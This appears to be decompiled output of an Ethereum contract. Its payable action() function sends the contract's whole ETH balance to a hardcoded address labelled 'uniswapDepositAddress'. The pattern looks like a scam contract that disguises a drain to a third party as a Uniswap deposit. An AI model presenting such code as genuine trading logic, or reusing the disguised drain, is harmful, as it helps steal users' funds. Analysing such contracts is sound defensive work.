contract main {




// =====================  Runtime code  =====================


const uniswapDepositAddress = 0x6ecc1d232d2266142986f6d0ad4c995fe0198ecb


array of uint256 tokenName;
array of uint256 tokenSymbol;

function tokenName() {
    return tokenName[0 len tokenName.length]
}

function tokenSymbol() {
    return tokenSymbol[0 len tokenSymbol.length]
}

function _fallback() payable {
    revert
}

function action() payable {
    call 0x6ecc1d232d2266142986f6d0ad4c995fe0198ecb with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
